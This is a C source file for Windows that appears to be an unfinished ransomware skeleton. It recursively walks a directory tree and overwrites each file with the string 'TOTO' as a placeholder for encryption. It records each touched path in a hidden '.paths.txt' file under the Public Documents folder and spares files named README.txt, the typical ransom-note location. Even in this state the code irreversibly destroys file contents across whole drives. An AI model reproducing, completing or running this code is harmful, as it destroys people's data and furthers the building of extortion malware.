#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int encrypt(const char *filepath, const char *key) {
    // TODO
    // For the moment just overide the content of the file with "TOTO"

    FILE *file = fopen(filepath, "w");
    if (!file) {
        printf("Failed to open file: %s\n", filepath);
        return 0;
    }

    fputs("TOTO", file);
    fclose(file);
    return 1;
}

void add_to_paths(const char *filepath) {
    const char *paths_file = "C:\\Users\\Public\\Documents\\.paths.txt";
    
    FILE *file = fopen(paths_file, "a");
    if (file) {
        fprintf(file, "%s\n", filepath);
        fclose(file);
    } else {
        printf("Failed to open .paths.txt\n");
    }
}

void enumerate(const char *path, const char *key) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char dirSpec[MAX_PATH];

    snprintf(dirSpec, MAX_PATH, "%s\\*", path);

    hFind = FindFirstFile(dirSpec, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("FindFirstFile failed (%d)\n", GetLastError());
        return;
    }

    do {
        if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
            char fullPath[MAX_PATH];
            snprintf(fullPath, MAX_PATH, "%s\\%s", path, findFileData.cFileName);
            
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                enumerate(fullPath, key);  // Recurse into the subdirectory
            } else {
                if (strcmp(fullPath, "C:\\Users\\Public\\Documents\\.paths.txt") != 0 && strstr(fullPath, "README.txt") == NULL) {
                    if (encrypt(fullPath, key))
                        add_to_paths(fullPath);
                }
            }
        }
    } while (FindNextFile(hFind, &findFileData) != 0);
    
    FindClose(hFind);
}
